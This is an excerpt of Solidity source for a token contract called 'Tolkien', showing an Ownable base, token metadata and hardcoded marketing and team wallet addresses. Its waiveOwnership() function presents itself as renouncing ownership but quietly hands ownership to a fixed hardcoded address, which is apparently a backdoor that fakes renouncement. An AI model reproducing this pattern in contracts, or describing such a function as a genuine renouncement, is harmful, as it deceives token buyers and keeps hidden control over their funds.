...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x34be8Ac1C257e8c10661dE25E4A574E86E4e4b38));
        _owner = address(0x34be8Ac1C257e8c10661dE25E4A574E86E4e4b38);
    }
...
contract Tolkien is Context, IERC20, Ownable {
    ...
    string private _name = "Tolkien";
    string private _symbol = "Tolkien";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7952757D122584c7dcF4fA98225d04bD919Cb4ce);
    address payable public teamWalletAddress = payable(0x141145129d8d068b71A531bD777622cAe4133875);
